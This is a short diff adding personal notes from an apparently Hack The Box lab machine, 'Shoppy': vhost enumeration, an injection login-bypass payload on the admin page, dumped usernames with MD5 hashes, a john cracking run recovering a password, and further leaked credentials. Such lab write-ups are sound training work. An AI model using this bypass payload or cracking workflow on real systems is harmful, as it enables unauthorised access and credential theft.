@@ -1,0 +1,43 @@
+# enum we get
+```
+http://shoppy.htb
+```
+
+```
+gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb
+```
+
+```
+mattermost.shoppy.htb
+```
+
+# sqli
+http://shoppy.htb/admin
+```
+admin'||'1==1
+```
+
+# creds
+```json
+[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
+```
+
+# crack
+```
+⋊> ~/D/M/D/W/H/Shoppy on main ⨯ john josh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5                                                20:07:44
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+remembermethisway (?)
+1g 0:00:00:00 DONE (2022-10-14 20:07) 16.66g/s 13532Kp/s 13532Kc/s 13532KC/s renato123456..remaryl
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+```
+
+# creds
+```
+For the deploy machine, you can create an account with these creds :
+username: jaeger
+password: Sh0ppyBest@pp!
+```
